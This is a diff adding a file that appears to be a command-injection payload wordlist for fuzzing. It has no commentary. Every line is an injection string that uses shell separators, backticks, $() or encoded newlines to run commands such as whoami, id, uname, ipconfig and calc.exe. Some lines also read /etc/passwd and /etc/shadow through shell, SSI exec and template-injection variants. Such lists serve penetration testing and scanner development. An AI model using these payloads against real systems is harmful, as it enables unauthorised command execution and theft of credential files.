@@ -1,0 +1,94 @@
+\r\n\'&&\'calc.exe
+test"+Runtime.getRuntime()+"test
+';calc.exe
+;calc.exe;
+;calc.exe
+;`calc.exe`;
+;`calc.exe`
+%0d%0a\'&&calc.exe\'
+%0d%0a\'&&calc.exe&&\'
+%0d%0a\'&&`calc.exe`\'
+%0d%0a\'&&`calc.exe`&&\'
+%0d%0a\'&&\'calc.exe
+\r\n\"||calc.exe||\"
+\r\n\"||calc.exe\"
+\n\'&&\'calc.exe
+\';calc.exe\'
+\';calc.exe;\'
+\';`calc.exe`\'
+\';`calc.exe`;\'
+| whoami
+; whoami
+' whoami
+' || whoami
+' & whoami
+' && whoami
+'; whoami
+" whoami
+" || whoami
+" | whoami
+" & whoami
+" && whoami
+"; whoami
+$(`whoami`)
+& whoami
+&& whoami
+{{ get_user_file("/etc/hosts") }}
+|/usr/bin/id
+;|/usr/bin/id|
+;/usr/bin/id|
+$;/usr/bin/id
+uname
+;uname;
+| uname -a
+; uname -a
+& uname -a
+&& uname -a
+/index.html|id|
+ipconfig
+| ipconfig /all
+; ipconfig /all
+& ipconfig /all
+&& ipconfig /all
+ipconfig /all
+ls
+$(`ls`)
+| ls -l /
+; ls -l /
+& ls -l /
+&& ls -l /
+`id`
+|id
+| id
+;id
+;id|
+;id;
+& id
+cat /etc/hosts
+$(`cat /etc/passwd`)
+cat /etc/passwd
+%0Acat%20/etc/passwd
+{{ get_user_file("/etc/passwd") }}
+<!--#exec cmd="/bin/cat /etc/passwd"-->
+<!--#exec cmd="/bin/cat /etc/shadow"-->
+|/bin/ls -al
+a);/usr/bin/id
+a;/usr/bin/id
+a);/usr/bin/id;
+a;/usr/bin/id;
+a);/usr/bin/id|
+a;/usr/bin/id|
+;id;
+;id
+;netstat -a;
+;system('cat%20/etc/passwd')
+;id;
+|id
+|/usr/bin/id
+|id|
+|/usr/bin/id|
+||/usr/bin/id|
+|id;
+||/usr/bin/id;
+;id|
+;|/usr/bin/id|
